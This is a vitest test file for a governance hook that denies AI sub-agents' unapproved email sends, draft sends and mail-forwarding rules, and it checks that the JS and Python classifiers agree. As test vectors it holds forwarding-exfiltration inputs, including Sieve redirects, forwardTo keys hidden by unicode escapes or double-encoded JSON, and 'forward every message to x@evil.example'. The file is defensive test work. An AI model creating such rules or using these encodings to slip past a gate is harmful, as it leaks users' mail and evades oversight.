import { describe, it, expect } from 'vitest'
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
// @ts-expect-error -- plain .mjs hook script, no types
import { gateDecision, hasForwardKey, hasForwardKeyName, isPlainDraft, isReadAction, mailRuleForward as mailRuleForwardJs, mailToolAction, manageEmailOpClosed, manageEmailOpKey, manageEmailOpOutbound } from '../../scripts/email-send-gate.mjs'

// graph-forward N1b (spec G1-G7): the mail tools are recognised by their
// ACTION, whatever the server name or version prefix. The gap it closes: the
// gates knew a fixed list of NAMES, so a sub-agent could send through
// mcp__gmail-v2__v2_send_draft or __v2_reply_all with no gate at all, and
// v2_draft_email skipped the ledger check.
//
// The same rules live twice: mailToolAction here (the sub-agent hard gate) and
// mail_tool_action in scripts/hooks/email_extract.py (the main agent's approval
// and copy gates). This file binds the two on the shared vectors
// (scripts/hooks/mail-tool-action-cases.json): every case and every classifier
// edge goes through BOTH and must equal the expected class; a fix applied to
// one copy only fails here. The python gates themselves run the same cases in
// scripts/__tests__/mail-tool-action.test.py.

const ROOT = join(__dirname, '..', '..')
const GATE = join(ROOT, 'scripts', 'email-send-gate.mjs')
const EXTRACT_DIR = join(ROOT, 'scripts', 'hooks')
type Expected = 'send' | 'draft' | 'nonsend'
const VECTORS = JSON.parse(readFileSync(join(EXTRACT_DIR, 'mail-tool-action-cases.json'), 'utf-8')) as {
  cases: Array<{ name: string; tool: string; input: Record<string, unknown>; expected: Expected }>
  // `input` is optional: present = the input-aware call (create_rule / create_filter), absent = name only
  classifier_edges: Array<{ tool: unknown; input?: unknown; expected: 'send' | 'draft' | null; note: string }>
}
const AS_CLASS: Record<Expected, 'send' | 'draft' | null> = { send: 'send', draft: 'draft', nonsend: null }

// One python process for every call: stdin carries [name, hasInput, input] triples, stdout the classes.
function pythonActions(calls: Array<[unknown, boolean, unknown]>): Array<string | null> {
  const out = execFileSync('python3', ['-I', '-c', `
import json, sys
sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
from email_extract import mail_tool_action
print(json.dumps([mail_tool_action(n, i) if h else mail_tool_action(n) for n, h, i in json.load(sys.stdin)]))
`], { encoding: 'utf-8', input: JSON.stringify(calls) })
  return JSON.parse(out.trim())
}

// the JS side of one edge: input-aware when the edge carries an input
const jsEdgeAction = (e: { tool: unknown; input?: unknown }) =>
  'input' in e ? mailToolAction(e.tool as string, e.input) : mailToolAction(e.tool as string)

const RECIPIENT_FIELDS = ['to', 'cc', 'bcc', 'recipients', 'recipient', 'recipient_email']
const hasRecipient = (input: Record<string, unknown>) =>
  RECIPIENT_FIELDS.some((f) => input[f] !== undefined && input[f] !== null && input[f] !== '')

describe('mail-tool action: python and JS agree with the shared contract', () => {
  const caseNames = VECTORS.cases.map((c) => c.tool)
  const py = pythonActions([
    ...VECTORS.cases.map((c): [unknown, boolean, unknown] => [c.tool, false, null]),
    ...VECTORS.classifier_edges.map((e): [unknown, boolean, unknown] => [e.tool, 'input' in e, e.input ?? null]),
  ])

  VECTORS.cases.forEach((c, i) => {
    it(`${c.tool} -> ${c.expected}`, () => {
      expect(mailToolAction(c.tool), 'JS').toBe(AS_CLASS[c.expected])
      expect(py[i], 'python').toBe(AS_CLASS[c.expected])
    })
  })

  VECTORS.classifier_edges.forEach((e, i) => {
    it(`edge ${JSON.stringify(e.tool)} -> ${e.expected} (${e.note})`, () => {
      expect(jsEdgeAction(e), 'JS').toBe(e.expected)
      expect(py[caseNames.length + i], 'python').toBe(e.expected)
    })
  })

  it('the lists are non-trivial in every class', () => {
    for (const cls of ['send', 'draft', 'nonsend']) {
      expect(VECTORS.cases.some((c) => c.expected === cls), cls).toBe(true)
    }
    expect(VECTORS.classifier_edges.length).toBeGreaterThanOrEqual(20)
  })
})

// card 2f835ee4 r5 (AC1-AC7): the manage_email multiplexer is classified by its OPERATION. One
// normalisation (ASCII-whitespace strip, ASCII lower-case, "-" and "_" removed, exact match on
// send / reply / replyall / forward) lives twice: manageEmailOpOutbound here and
// manage_email_op_outbound in email_extract.py. Every row of the manage_email_ops block goes
// through BOTH, and the sub-agent gate and the python entry points must follow.
const OPS = (VECTORS as unknown as { manage_email_ops: Array<{ op: unknown; outbound: boolean; closed?: boolean; note: string }> })
  .manage_email_ops

function pythonOps(ops: unknown[]): boolean[][] {
  const out = execFileSync('python3', ['-I', '-c', `
import json, sys
sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
from email_extract import manage_email_op_outbound, manage_email_op_closed
print(json.dumps([[manage_email_op_outbound(o), manage_email_op_closed(o)] for o in json.load(sys.stdin)]))
`], { encoding: 'utf-8', input: JSON.stringify(ops) })
  return JSON.parse(out.trim())
}

describe('manage_email operations: python and JS agree on the shared block', () => {
  // Rows plus non-string values: neither side may throw, neither takes them for outbound.
  const NON_STRINGS: unknown[] = [null, 123, ['send'], { op: 'send' }, true]
  const py = pythonOps([...OPS.map((r) => r.op), ...NON_STRINGS])

  it('the block is non-trivial: >= 20 rows, outbound and not', () => {
    expect(OPS.length).toBeGreaterThanOrEqual(20)
    expect(new Set(OPS.map((r) => r.outbound))).toEqual(new Set([true, false]))
  })

  OPS.forEach((r, i) => {
    it(`${JSON.stringify(r.op)} -> outbound=${r.outbound} (${r.note})`, () => {
      expect(manageEmailOpOutbound(r.op), 'JS').toBe(r.outbound)
      expect(py[i][0], 'python').toBe(r.outbound)
    })
    // card d8d3441e: the closed rule (outbound OR unreadable), same row, both twins
    const closed = r.closed ?? r.outbound
    it(`${JSON.stringify(r.op)} -> closed=${closed} (${r.note})`, () => {
      expect(manageEmailOpClosed(r.op), 'JS').toBe(closed)
      expect(py[i][1], 'python').toBe(closed)
    })
  })

  it('card d8d3441e: the block pins closed on missing-like and non-string operations', () => {
    expect(OPS.some((r) => r.op === null && r.closed === true)).toBe(true)
    expect(OPS.some((r) => Array.isArray(r.op) && r.closed === true)).toBe(true)
    expect(OPS.some((r) => typeof r.op === 'number' && r.closed === true)).toBe(true)
    expect(OPS.some((r) => r.op === 'search' && r.closed === false)).toBe(true)
    expect(manageEmailOpClosed(undefined)).toBe(true)
    expect(manageEmailOpClosed(['send'])).toBe(true)
  })

  NON_STRINGS.forEach((v, i) => {
    it(`a non-string operation ${JSON.stringify(v)} is not outbound and does not throw`, () => {
      expect(manageEmailOpOutbound(v)).toBe(false)
      expect(py[OPS.length + i][0]).toBe(false)
      expect(py[OPS.length + i][1]).toBe(true)
    })
  })

  it('the key strips ASCII whitespace only: NBSP and BOM stay (trim() would take them)', () => {
    expect(manageEmailOpKey(' Re-Ply_ALL\t')).toBe('replyall')
    expect(manageEmailOpKey(' send')).toBe(' send')
    expect(manageEmailOpKey('send﻿')).toBe('send﻿')
    expect(manageEmailOpKey('İ')).toBe('İ')
  })

  it('AC3: nothing a gate took for outbound before the change is narrower now', () => {
    // The pre-r5 JS set was lower-case only (no strip, no separator drop); the approval gate's
    // aliases add "reply_all" and "-" for "_". Spelled out, not imported.
    const PRE_R5 = ['send', 'reply', 'replyall', 'forward', 'reply_all']
    for (const base of PRE_R5) {
      for (const form of [base, base.toUpperCase(), base.replace('_', '-'), ` ${base} `]) {
        expect(manageEmailOpOutbound(form), form).toBe(true)
      }
    }
  })

  it('timing: a 50 000 character operation string is judged in well under a second', () => {
    const t0 = Date.now()
    for (const op of [' '.repeat(50_000) + 'x', 'x'.repeat(50_000), '_'.repeat(50_000), ' '.repeat(50_000)]) {
      manageEmailOpOutbound(op)
    }
    expect(Date.now() - t0).toBeLessThan(1000)
  })
})

describe('manage_email operations: the sub-agent gate follows the block', () => {
  const ME = 'mcp__google-workspace__manage_email'
  OPS.forEach((r) => {
    // card d8d3441e: the closed rule (outbound OR unreadable) decides, same row as the twins
    const closed = r.closed ?? r.outbound
    it(`${JSON.stringify(r.op)}: ${closed ? 'draft-required' : 'passes'}`, () => {
      const v = gateDecision(ME, { operation: r.op, to: ['a@b.hu'], body: 'Kedves Ugyfelunk!' }, () => true)
      expect(v).toEqual(closed ? { deny: true, kind: 'draft-required' } : { deny: false })
    })
  })

  it('AC5: reply_all with draft:true passes for a sourced recipient, an unsourced one is denied', () => {
    for (const op of ['reply', 'reply_all', 'REPLY-ALL']) {
      expect(gateDecision(ME, { operation: op, draft: true, to: ['a@b.hu'] }, () => true), op).toEqual({ deny: false })
      expect(gateDecision(ME, { operation: op, draft: 'true', to: ['a@b.hu'] }, () => true), op).toEqual({ deny: false })
      expect(gateDecision(ME, { operation: op, draft: true, to: ['a@b.hu'] }, () => false).kind, op)
        .toBe('unverified-recipient')
      expect(gateDecision(ME, { operation: op, draft: 'yes', to: ['a@b.hu'] }, () => true).kind, op)
        .toBe('draft-required')
    }
  })

  it('a missing or non-string operation is closed: address check + draft rule (card d8d3441e)', () => {
    for (const v of [undefined, null, 123, {}, true, ['reply_all'], ['send']]) {
      expect(gateDecision(ME, { operation: v, to: ['a@b.hu'] }, () => true), String(v))
        .toEqual({ deny: true, kind: 'draft-required' })
      expect(gateDecision(ME, { operation: v, draft: true, to: ['a@b.hu'] }, () => false).kind, String(v))
        .toBe('unverified-recipient')
    }
  })
})

/** Vector class 'draft', but ranked as a send by the (stricter) name classifier: Brainy 4952. */
const STRICTER_THAN_VECTOR = new Set(['mcp__gmail__create_draft_reply'])

describe('sub-agent hard gate (gateDecision) on every case', () => {
  const allVerified = () => true
  const noneVerified = () => false

  VECTORS.cases.forEach((c) => {
    it(`${c.tool}: ${c.expected}`, () => {
      const ok = gateDecision(c.tool, c.input, allVerified)
      const bad = gateDecision(c.tool, c.input, noneVerified)
      if (c.expected === 'send') {
        // unconditional: the ledger does not matter, and never the draft wording
        expect(ok.deny).toBe(true)
        expect(bad.deny).toBe(true)
        expect(ok.kind).not.toBe('unverified-recipient')
        expect(ok.kind).not.toBe('draft-required')
      } else if (STRICTER_THAN_VECTOR.has(c.tool)) {
        // Brainy 4952: the name classifier merged from v1.45.0 ranks a "...reply" on a gmail server as a
        // connector send, which this gate denies unconditionally. Proof it is not looser than the vector's
        // 'draft' class: it denies in the cases where the draft class denies (a bad ledger) AND where it
        // does not (all verified); nothing the vector lets through is let through here.
        expect(ok.deny).toBe(true)
        expect(bad.deny).toBe(true)
        expect(ok.kind).toBe('connector-send')
      } else if (c.expected === 'draft') {
        expect(ok).toEqual({ deny: false })
        if (hasRecipient(c.input)) {
          expect(bad.deny).toBe(true)
          expect(bad.kind).toBe('unverified-recipient')
        } else {
          expect(bad).toEqual({ deny: false })
        }
      } else {
        expect(ok).toEqual({ deny: false })
        expect(bad).toEqual({ deny: false })
      }
    })
  })

  it('the names the old patterns knew keep their old kind (G6)', () => {
    expect(gateDecision('mcp__gmail__send_email', {}, () => true).kind).toBe('send_email')
    expect(gateDecision('mcp__claude_ai_Gmail__send_message', {}, () => true).kind).toBe('connector-send')
    // v1.45.0 names send_draft itself: the same unconditional deny as the action classifier gave
    // (Brainy 4952: the stricter-or-equal classification stays), under the kind 'send-draft'.
    expect(gateDecision('mcp__gmail-v2__v2_send_draft', { draftId: 'd' }, () => true)).toEqual({ deny: true, kind: 'send-draft' })
  })

  it('a new draft tool ledger-checks every recipient field, like the old draft tools', () => {
    const verdict = gateDecision('mcp__gmail-v2__v2_draft_email',
      { to: ['ok@x.hu'], cc: 'nincs@x.hu', body: 'b' }, (a: string) => a === 'ok@x.hu')
    expect(verdict).toEqual({ deny: true, kind: 'unverified-recipient', addresses: ['nincs@x.hu'] })
  })

  it('a label / filter creation (not a draft since card 6151bb4d) with no recipient is not blocked', () => {
    expect(gateDecision('mcp__gmail__create_label', { name: 'Ugyfel' }, () => false)).toEqual({ deny: false })
    expect(gateDecision('mcp__gmail__create_filter', { criteria: { subject: 'invoice' }, action: { addLabelIds: ['L1'] } }, () => false)).toEqual({ deny: false })
    expect(mailToolAction('mcp__gmail__create_label')).toBe(null)
    // rule / filter: name only is a draft (fail-closed), the clean input lowers it to null
    expect(mailToolAction('mcp__gmail__create_filter')).toBe('draft')
    expect(mailToolAction('mcp__gmail__create_filter', { criteria: { subject: 'invoice' } })).toBe(null)
    // forwarding anywhere (case-insensitive key, nested, any value) makes it a send (card 6151bb4d r2)
    expect(mailToolAction('mcp__gmail__create_filter', { action: { Forward: '' } })).toBe('send')
    expect(mailToolAction('mcp__ms365__create-rule', { actions: { redirectTo: [] } })).toBe('send')
    expect(gateDecision('mcp__ms365__create-rule', { to: ['nincs@x.hu'], actions: { forwardTo: ['nincs@x.hu'] } },
      () => false)).toEqual({ deny: true, kind: 'mail-rule-forward' })
    // the walk is bounded: too deep or too wide is "has a forward key" (fail-closed)
    let deep: Record<string, unknown> = { a: 1 }
    for (let i = 0; i < 40; i++) deep = { n: deep }
    expect(hasForwardKey(deep)).toBe(true)
    expect(hasForwardKey({ list: Array.from({ length: 6000 }, (_, i) => i) })).toBe(true)
    expect(hasForwardKey({ list: [1, 2, { x: 'y' }] })).toBe(false)
    expect(hasForwardKey('forward')).toBe(true)
    expect(hasForwardKey(null)).toBe(true)
    // the draft path itself stays gated
    expect(gateDecision('mcp__gmail__create_draft', { to: ['nincs@x.hu'] }, () => false).deny).toBe(true)
  })
})

describe('gate script entrypoint (spawned, no network)', () => {
  const run = (args: string[], payload: unknown) => {
    const out = execFileSync(process.execPath, [GATE, ...args], {
      input: JSON.stringify(payload),
      timeout: 15_000,
      env: { ...process.env },
    }).toString()
    return out ? JSON.parse(out) : null
  }

  it('v2_send_draft gets the governance deny', () => {
    const res = run([], { tool_name: 'mcp__gmail-v2__v2_send_draft', tool_input: { draftId: 'draft-7' } })
    expect(res.hookSpecificOutput.permissionDecision).toBe('deny')
    expect(res.hookSpecificOutput.permissionDecisionReason).toContain('governance hard-gate')
  })

  it('the thread-reply capability never narrows an action-recognised send', () => {
    const res = run(['--allow-thread-reply'], {
      tool_name: 'mcp__gmail-v2__v2_reply_all',
      tool_input: { threadId: 't1', messageId: 'msg-42', to: ['partner@ceg.hu'], body: 'Kedves Partner!' },
    })
    expect(res.hookSpecificOutput.permissionDecision).toBe('deny')
    expect(res.hookSpecificOutput.permissionDecisionReason).toContain('governance hard-gate')
    expect(res.hookSpecificOutput.permissionDecisionReason).not.toContain('szal-kapu')
  })

  it('a read and a channel reply pass (empty stdout, exit 0)', () => {
    expect(run([], { tool_name: 'mcp__gmail__search_emails', tool_input: { query: 'x' } })).toBeNull()
    expect(run([], { tool_name: 'mcp__plugin_telegram_telegram__reply', tool_input: { chat_id: '1', text: 'Szia' } }))
      .toBeNull()
  })
})

// card 6151bb4d: the name-by-verb fallback must not close channel servers and
// non-draft "create_*" tools, and must keep closing every real mail send/draft.
describe('mail-tool fallback narrowing (card 6151bb4d)', () => {
  const verified = (a: string) => a === 'known@example.com'
  const input = { to: ['invented@example.com'], operation: 'send' }
  const channel = [
    'mcp__slack__send_message', 'mcp__slack__reply', 'mcp__Slack__forward',
    'mcp__ms365__send-chat-message', 'mcp__ms365__reply-to-chat-message',
    'mcp__ms365-v2__send-channel-message', 'mcp__ms365__send-my-activity-notification',
    'mcp__plugin_discord_discord__reply', 'mcp__plugin_discord_discord__send_message',
    'mcp__plugin_telegram_telegram__send_message', 'mcp__plugin_telegram_telegram__reply',
  ]
  const nonDraftCreate = [
    'mcp__gmail__create_label', 'mcp__gmail__create_folder',
    'mcp__gmail__create_contact', 'mcp__gmail__create_task', 'mcp__gmail__list_new_emails',
    'mcp__gmail__get_new_messages', 'mcp__google-drive__createGoogleDoc', 'mcp__gmail__v2get_draft', 'mcp__gmail__xdelete_draft',
  ]
  const stillGated: Array<[string, string]> = [
    ['mcp__gmail__create_draft', 'unverified-recipient'], ['mcp__gmail__createDraft', 'unverified-recipient'],
    ['mcp__gmail__create_message', 'unverified-recipient'], ['mcp__gmail__create_mail', 'unverified-recipient'],
    ['mcp__ms365__create-reply-all-draft', 'unverified-recipient'],
    ['mcp__harder-mail__send_mail', 'connector-send'], ['mcp__ms365__send-mail', 'mail-tool-send'],
    ['mcp__slack__send_email', 'mail-tool-send'], ['mcp__slack-mail__sendMail', 'mail-tool-send'],
    ['mcp__ms365_mail__send-chat-message', 'mail-tool-send'],
    ['mcp__gmail-v2__v2_send_draft', 'mail-tool-send'], ['mcp__gmail__v2get_send_as', 'mail-tool-send'],
  ]

  it('channel servers are not mail: the gate lets them through, even with a recipient field', () => {
    for (const t of channel) {
      expect(mailToolAction(t), t).toBe(null)
      expect(gateDecision(t, input, verified).deny, t).toBe(false)
    }
  })

  it('create / get / delete without a mail noun is no draft', () => {
    for (const t of nonDraftCreate) {
      expect(mailToolAction(t, input), t).toBe(null)
      expect(gateDecision(t, input, verified).deny, t).toBe(false)
    }
  })

  it('create is a draft by default: appointment, entry, rsvp, response, answer are ledger-checked', () => {
    for (const t of ['create_appointment', 'create_calendar_entry', 'create_rsvp', 'create_response',
      'create_answer', 'create_contact_invite', 'create_new_email'].map((n) => `mcp__google-calendar__${n}`)) {
      expect(mailToolAction(t, input), t).toBe('draft')
      expect(gateDecision(t, input, verified).deny, t).toBe(true)
      expect(gateDecision(t, { to: ['known@example.com'] }, verified).deny, t).toBe(false)
    }
  })

  it('a filter / rule write with an address in its input is a forward: denied even for a known address', () => {
    const t = 'mcp__google-calendar__create_filter_from_template'
    for (const inp of [input, { to: ['known@example.com'] }]) {
      const d = gateDecision(t, inp, verified)
      expect(d.deny, t).toBe(true)
      expect(d.kind, t).toBe('mail-rule-forward')
    }
  })

  // card 6151bb4d r2 (B2, B3): a rule / filter write whose input forwards is DENIED outright
  // (kind mail-rule-forward), the five shapes the review found plus the key / value / JSON rules.
  const forwardShapes: Array<[string, Record<string, unknown>]> = [
    ['stringified JSON with a forward key', { body: JSON.stringify({ forwardTo: 'x' }) }],
    ['stringified JSON, key hidden by a unicode escape', { body: '{"\\u0066orwardTo": 1}' }],
    ['double-encoded JSON', { body: JSON.stringify(JSON.stringify({ redirectTo: 1 })) }],
    ['Sieve redirect', { script: 'require ["copy"]; redirect :copy "x@y.hu";' }],
    ['actions list, type forward', { actions: [{ type: 'forward', address: 'x@y.hu' }] }],
    ['autoForward key', { actions: { autoForward: 'x@y.hu' } }],
    ['dotted action.forward key', { 'action.forward': 'x@y.hu' }],
    ['forwardTo', { forwardTo: ['a@b.hu'] }],
    ['redirectTo nested', { actions: { redirectTo: [{ emailAddress: { address: 'a@b.hu' } }] } }],
    ['forwardAsAttachmentTo, empty', { actions: { forwardAsAttachmentTo: [] } }],
    ['an address in a string value', { criteria: { from: 'x@y.hu' }, action: { addLabelIds: ['L1'] } }],
  ]
  it('a forwarding rule / filter write is a send and a gate-level DENY, whatever the ledger knows', () => {
    for (const t of ['mcp__ms365__create_rule', 'mcp__gmail__create_filter', 'mcp__gmail__createRule',
      'mcp__outlook__update_filter', 'mcp__gmail__set_rule', 'mcp__gmail__create_inbox_rules']) {
      for (const [label, ti] of forwardShapes) {
        expect(mailToolAction(t, ti), `${t} ${label}`).toBe('send')
        expect(gateDecision(t, ti, () => true), `${t} ${label}`).toEqual({ deny: true, kind: 'mail-rule-forward' })
      }
    }
  })

  it('a label-only rule / filter and non-write names are not caught by the forwarding rule', () => {
    const clean = { criteria: { subject: 'invoice' }, action: { addLabelIds: ['L1'] } }
    for (const t of ['mcp__gmail__create_filter', 'mcp__ms365__create_rule', 'mcp__gmail__createRule', 'mcp__gmail__set_rule']) {
      expect(mailToolAction(t, clean), t).toBe(null)
      expect(gateDecision(t, clean, () => false), t).toEqual({ deny: false })
    }
    expect(mailToolAction('mcp__gmail__create_filter')).toBe('draft') // name only
    // card 3d6e5181 N3: delete / create_label are non-readers, so a forwardTo key now forwards under
    // any name (they were null under the closed rule/filter list); a reader stays a reader
    expect(mailToolAction('mcp__gmail__delete_filter', { forwardTo: 'x' })).toBe('send')
    expect(mailToolAction('mcp__gmail__get_filter', { forwardTo: 'x' })).toBe(null)
    expect(mailToolAction('mcp__gmail__create_label', { forwardTo: 'x' })).toBe('send')
    expect(mailToolAction('mcp__gmail__create_label', { name: 'X' })).toBe(null)
    expect(mailToolAction('mcp__slack__create_rule', { forwardTo: 'x' })).toBe(null)
    // an input that is not an object cannot be read: forwarding, fail-closed
    expect(mailToolAction('mcp__gmail__create_rule', 'x')).toBe('send')
  })

  it('create is a draft unless EVERY word after it is a closed noun or modifier (B1)', () => {
    for (const n of ['create_reply_to_contact', 'createReplyToContact', 'create_forward_to_contact',
      'create_message_for_contact', 'create_email_to_contacts', 'create_mail_for_task', 'create_invite_for_task',
      'create_event_task']) {
      const t = `mcp__gmail__${n}`
      expect(mailToolAction(t), t).toBe('draft')
      expect(mailToolAction(t, input), t).toBe('draft')
      expect(gateDecision(t, input, verified), t).toEqual({ deny: true, kind: 'unverified-recipient', addresses: ['invented@example.com'] })
    }
    for (const n of ['create_label', 'create_folder', 'createGoogleDoc', 'create_shared_folder', 'create_contact', 'create_task']) {
      const t = `mcp__gmail__${n}`
      expect(mailToolAction(t, input), t).toBe(null)
      expect(gateDecision(t, input, verified), t).toEqual({ deny: false })
    }
  })

  it('real mail sends and drafts still close', () => {
    for (const [t, kind] of stillGated) {
      const d = gateDecision(t, input, verified)
      expect(d.deny, t).toBe(true)
      // The property is the deny; the kind depends on which gate branch claims the
      // name first (connector-send runs before mail-tool-send), so only drafts pin it.
      if (kind === 'unverified-recipient') expect(d.kind, t).toBe(kind)
      else expect(typeof d.kind === 'string' && d.kind.length > 0, t).toBe(true)
    }
    // a draft to a sourced address passes, as before
    expect(gateDecision('mcp__gmail__create_draft', { to: ['known@example.com'] }, verified).deny).toBe(false)
  })
})

// card 3d6e5181 N3: the name-independent forwarding rule. A non-reader call of a mail server whose
// input forwards (a forward / redirect KEY, or a forward / redirect WORD in a value outside the
// free-text keys) is a send for the classifier and mail-rule-forward for the gate, under ANY name;
// readers stay allowed; a draft with "looking forward" in its body is still a draft. The vectors
// are the `name_independent` block of mail-tool-action-cases.json; the python twin runs the same
// block (scripts/__tests__/mail-tool-action.test.py), here both sides are compared call by call.
type Ni = {
  servers: string[]; forward_names: string[]; disguised_names: string[]; reader_names: string[]
  forward_shapes: Array<{ label: string; input: unknown }>
  reader_inputs: Array<{ label: string; input: unknown }>
  reviewer_n4: Array<{ tool: string; input: unknown; note: string }>
  clean: Array<{ tool: string; input: unknown; expected: 'draft' | null; note: string }>
}
const NI = (JSON.parse(readFileSync(join(EXTRACT_DIR, 'mail-tool-action-cases.json'), 'utf-8')) as { name_independent: Ni }).name_independent
describe('name-independent forwarding rule (card 3d6e5181 N3): JS and python agree', () => {
  const T = (s: string, n: string) => `mcp__${s}__${n}`
  const none = () => false
  const calls: Array<[string, unknown, string]> = []
  for (const s of NI.servers) {
    for (const n of [...NI.forward_names, ...NI.disguised_names]) for (const f of NI.forward_shapes) calls.push([T(s, n), f.input, `${f.label}`])
    for (const n of NI.reader_names) for (const f of NI.reader_inputs) calls.push([T(s, n), f.input, `reader ${f.label}`])
  }
  for (const c of NI.clean) calls.push([c.tool, c.input, c.note])
  const py = pythonActions(calls.map((c): [unknown, boolean, unknown] => [c[0], true, c[1]]))
  const ruleOut = JSON.parse(execFileSync('python3', ['-I', '-c', `
import json, sys
sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
from email_extract import mail_rule_forward
print(json.dumps([mail_rule_forward(n, i) for n, i in json.load(sys.stdin)]))
`], { encoding: 'utf-8', input: JSON.stringify(calls.map((c) => [c[0], c[1]])) }).trim()) as boolean[]

  it('every forward name x shape x server is a send and a mail-rule-forward deny, in both twins', () => {
    let n = 0
    calls.forEach((c, i) => {
      const [tool, input, label] = c
      if (label.startsWith('reader') || NI.clean.some((x) => x.tool === tool && x.input === input)) return
      n++
      expect(mailToolAction(tool, input), `${tool} ${label}`).toBe('send')
      expect(py[i], `py ${tool} ${label}`).toBe('send')
      expect(gateDecision(tool, input, () => true), `${tool} ${label}`).toEqual({ deny: true, kind: 'mail-rule-forward' })
    })
    expect(n).toBe(NI.servers.length * (NI.forward_names.length + NI.disguised_names.length) * NI.forward_shapes.length)
  })

  it('readers stay allowed whatever the input; the clean cases keep their class', () => {
    calls.forEach((c, i) => {
      const [tool, input, label] = c
      if (!label.startsWith('reader')) return
      expect(mailToolAction(tool, input), `${tool} ${label}`).toBe(null)
      expect(py[i], `py ${tool} ${label}`).toBe(null)
      expect(gateDecision(tool, input, none), `${tool} ${label}`).toEqual({ deny: false })
    })
    NI.clean.forEach((c) => {
      const i = calls.findIndex((x) => x[0] === c.tool && x[1] === c.input)
      expect(mailToolAction(c.tool, c.input), c.note).toBe(c.expected)
      expect(py[i], `py ${c.note}`).toBe(c.expected)
      expect(mailRuleForwardJs(c.tool, c.input), c.note).toBe(false)
      expect(ruleOut[i], `py rule ${c.note}`).toBe(false)
    })
    // a draft with prose in its body is still just a draft: unverified address denied, known one passes
    const d = { to: ['known@example.com'], subject: 'Hi', body: 'I am looking forward to it' }
    expect(gateDecision('mcp__gmail__create_draft', d, (a: string) => a === 'known@example.com')).toEqual({ deny: false })
    expect(gateDecision('mcp__outlook__manage_rules', { rules: [{ name: 'News', actions: { moveToFolder: 'F1' } }] }, none)).toEqual({ deny: false })
  })

  it('mailRuleForward agrees between the twins on every call, and classifier edges hold', () => {
    calls.forEach((c, i) => expect(mailRuleForwardJs(c[0], c[1]), `${c[0]} ${c[2]}`).toBe(ruleOut[i]))
    // the stricter 6151bb4d rule keeps counting a bare address for rule / filter names ...
    expect(mailToolAction('mcp__gmail__create_filter', { criteria: { from: 'x@y.hu' } })).toBe('send')
    // ... the name-independent one does not (decision Q4)
    expect(mailToolAction('mcp__imap__move_message', { messageId: '<abc@host>' })).toBe(null)
    // channel plugins and the excluded chat tools are out of scope
    expect(mailToolAction('mcp__plugin_telegram_telegram__edit_message', { forwardTo: 'x' })).toBe(null)
    expect(mailToolAction('mcp__ms365__send-chat-message', { forwardTo: 'x' })).toBe(null)
    // a non-object input of a non-reader cannot be read: forwarding, fail-closed; a reader stays a reader
    expect(mailToolAction('mcp__outlook__manage_rules', 'x')).toBe('send')
    expect(mailToolAction('mcp__outlook__get_rules', 'x')).toBe(null)
  })

  it('isReadAction: closed list, a sign anywhere makes it a write, unknown verbs are writes', () => {
    const r = (n: string) => isReadAction(n.split('__'))
    for (const n of ['get_rules', 'list_rules', 'getrules', 'search_emails', 'v2_get_settings', 'read_email', 'listEmails', 'export_rules',
      'watch_mailbox', 'search_address_book', 'describe_filter', 'fetch_message']) expect(r(n), n).toBe(true)
    for (const n of ['get_or_create_rule', 'list_and_forward', 'searchAndForward', 'manage_rules', 'define_rule', 'frobnicate_rules',
      'rules', 'get_and_purge', 'list_then_move', 'v2_manage_rules', 'update_settings']) expect(r(n), n).toBe(false)
  })

  it('hasForwardKeyName: keys anywhere, words in non-free values, bare addresses and prose do not count', () => {
    expect(hasForwardKeyName({ a: [{ B: { ForwardTo: 1 } }] })).toBe(true)
    expect(hasForwardKeyName({ type: 'forward' })).toBe(true)
    expect(hasForwardKeyName({ script: 'redirect :copy "x"' })).toBe(true)
    expect(hasForwardKeyName({ actionName: 'forward' })).toBe(true) // not a free-text key
    expect(hasForwardKeyName({ x: 'autoForward' })).toBe(true)
    expect(hasForwardKeyName({ x: 'straightforward' })).toBe(false)
    expect(hasForwardKeyName({ body: 'looking forward', subject: 'Fwd: forwarded', message_body: 'forward it' })).toBe(false)
    expect(hasForwardKeyName({ body: '{"forwardTo":"x"}' })).toBe(true) // a JSON string in a body is still walked for keys
    expect(hasForwardKeyName({ to: 'x@y.hu', id: '<a@b>' })).toBe(false)
    expect(hasForwardKeyName({ x: 'forward' }, false)).toBe(false)
    expect(hasForwardKeyName('x')).toBe(true)
    expect(hasForwardKeyName(null)).toBe(true)
  })

  it('N4 B2: the reviewer inputs are a send and a mail-rule-forward deny in both twins (Sieve redirect, forward instruction, fwd)', () => {
    expect(NI.reviewer_n4).toHaveLength(5)
    const pyN4 = pythonActions(NI.reviewer_n4.map((c): [unknown, boolean, unknown] => [c.tool, true, c.input]))
    NI.reviewer_n4.forEach((c, i) => {
      expect(mailToolAction(c.tool, c.input), c.note).toBe('send')
      expect(pyN4[i], `py ${c.note}`).toBe('send')
      expect(mailRuleForwardJs(c.tool, c.input), c.note).toBe(true)
      expect(gateDecision(c.tool, c.input, () => true), c.note).toEqual({ deny: true, kind: 'mail-rule-forward' })
    })
  })

  it('N4 B2: the whole word test reads the free text of a non-draft tool (strict) only; a plain draft stays prose', () => {
    const strict = (v: unknown) => hasForwardKeyName(v, true, true)
    expect(strict({ content: 'redirect :copy "x@evil.example";' })).toBe(true)
    expect(strict({ description: 'forward every message to x@evil.example' })).toBe(true)
    expect(strict({ body: 'FWD: all mail to x@evil.example' })).toBe(true)
    expect(hasForwardKeyName({ content: 'redirect :copy "x@evil.example";' }, true, false)).toBe(false)
    expect(hasForwardKeyName({ body: 'please forward this to x@y.example' }, true, false)).toBe(false)
    // card 61fcac1e: the narrow patterns (a forward word within 40 characters of an address, a quoted redirect
    // address) are gone; these three, which they let through, now deny in strict mode: any forward word counts,
    // no address needed (the Sieve command name cannot be encoded, so the word test closes what the patterns could not)
    expect(strict({ description: 'forward looking statement, mail me at some point' })).toBe(true)
    expect(strict({ body: 'forward ' + 'a'.repeat(41) + ' x@y.example' })).toBe(true)
    expect(strict({ body: 'redirect x@y.example' })).toBe(true)
    expect(strict({ body: 'straightforward x@y.example' })).toBe(false)
    expect(strict({ folder: 'forward to x@evil.example' })).toBe(false)
    expect(strict({ addLabelIds: ['fwd x@evil.example'] })).toBe(false)
    expect(hasForwardKeyName({ action: 'fwd' })).toBe(true)
    expect(hasForwardKeyName({ x: 'offwd' })).toBe(false)
    expect(isPlainDraft(['create_draft'], ['draft'])).toBe(true)
    expect(isPlainDraft(['update_settings'], ['draft'])).toBe(false)
